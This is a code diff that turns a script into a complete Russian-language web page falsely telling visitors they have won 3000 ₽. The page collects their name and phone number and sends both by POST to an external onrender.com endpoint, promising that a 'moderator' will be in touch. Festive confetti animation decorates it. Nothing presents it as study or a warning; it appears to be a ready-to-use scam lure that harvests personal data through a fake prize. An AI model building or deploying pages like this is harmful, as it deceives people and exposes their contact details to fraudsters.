@@ -1,73 +1,155 @@
-document.getElementById('prizeForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  const name = this.name.value.trim();
-  const phone = this.phone.value.trim();
-  const messageEl = document.getElementById('message');
-
-  if (!/^\+7\d{10}$/.test(phone)) {
-    messageEl.textContent = 'Введите корректный номер в формате +7XXXXXXXXXX';
-    messageEl.style.color = 'red';
-    return;
-  }
-
-  fetch('https://proxylast-1.onrender.com', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name, phone })  // отправка в тело name и phone
-  })
-  .then(res => {
-    if (res.ok) {
-      messageEl.textContent = 'Спасибо! С вами свяжется модератор.';
-      messageEl.style.color = 'green';
-      this.reset();
-    } else {
-      throw new Error();
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Вы выиграли приз!</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: #fff8f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
     }
-  })
-  .catch(() => {
-    messageEl.textContent = 'Ошибка отправки. Попробуйте позже.';
-    messageEl.style.color = 'red';
-  });
-});
-
-// Конфетти 🎉
-const canvas = document.getElementById('confetti');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
-
-let confetti = Array.from({ length: 300 }, () => ({
-  x: Math.random() * canvas.width,
-  y: Math.random() * canvas.height,
-  r: Math.random() * 6 + 4,
-  d: Math.random() * 20 + 10,
-  color: hsl(${Math.random() * 360}, 100%, 50%),
-  tilt: Math.random() * 10 - 10
-}));
-
-function drawConfetti() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  confetti.forEach(c => {
-    ctx.beginPath();
-    ctx.lineWidth = c.r;
-    ctx.strokeStyle = c.color;
-    ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
-    ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.d / 2);
-    ctx.stroke();
-  });
-  updateConfetti();
-  requestAnimationFrame(drawConfetti);
-}
-
-function updateConfetti() {
-  confetti.forEach(c => {
-    c.y += Math.cos(c.d) + 1 + c.r / 2;
-    c.x += Math.sin(0.01);
-    if (c.y > canvas.height) {
-      c.y = -10;
-      c.x = Math.random() * canvas.width;
+    .container {
+      text-align: center;
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      z-index: 1;
+      position: relative;
     }
-  });
-}
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 90%;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+    button {
+      background: #4caf50;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    #message {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 0;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="confetti"></canvas>
 
-drawConfetti();
+  <div class="container">
+    <h1>🎉 Поздравляем! Вы выиграли 3000 ₽</h1>
+    <p>Чтобы получить приз, введите своё имя и номер телефона:</p>
+    <form id="prizeForm">
+      <input type="text" name="name" placeholder="Ваше имя" required />
+      <input type="tel" name="phone" placeholder="+7XXXXXXXXXX" required />
+      <button type="submit">Получить приз</button>
+    </form>
+    <div id="message"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById('prizeForm');
+    const messageEl = document.getElementById('message');
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const name = this.name.value.trim();
+      const phone = this.phone.value.trim();
+
+      if (!/^\+7\d{10}$/.test(phone)) {
+        messageEl.textContent = 'Введите корректный номер в формате +7XXXXXXXXXX';
+        messageEl.style.color = 'red';
+        return;
+      }
+
+      try {
+        const res = await fetch('https://proxylast-1.onrender.com', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, phone })
+        });
+
+        const data = await res.json();
+        if (res.ok && data.ok) {
+          messageEl.textContent = 'Спасибо! С вами свяжется модератор.';
+          messageEl.style.color = 'green';
+          this.reset();
+        } else {
+          throw new Error();
+        }
+      } catch {
+        messageEl.textContent = 'Ошибка отправки. Попробуйте позже.';
+        messageEl.style.color = 'red';
+      }
+    });
+
+    // 🎊 Конфетти
+    const canvas = document.getElementById('confetti');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let confetti = Array.from({ length: 200 }, () => ({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height,
+      r: Math.random() * 6 + 2,
+      d: Math.random() * 10 + 5,
+      color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+      tilt: Math.random() * 10 - 5
+    }));
+
+    function drawConfetti() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      confetti.forEach(c => {
+        ctx.beginPath();
+        ctx.lineWidth = c.r;
+        ctx.strokeStyle = c.color;
+        ctx.moveTo(c.x + c.tilt, c.y);
+        ctx.lineTo(c.x, c.y + c.tilt + c.d / 2);
+        ctx.stroke();
+      });
+      updateConfetti();
+      requestAnimationFrame(drawConfetti);
+    }
+
+    function updateConfetti() {
+      confetti.forEach(c => {
+        c.y += Math.cos(c.d) + 1;
+        c.x += Math.sin(0.5);
+        if (c.y > canvas.height) {
+          c.y = -10;
+          c.x = Math.random() * canvas.width;
+        }
+      });
+    }
+
+    drawConfetti();
+  </script>
+</body>
+</html>
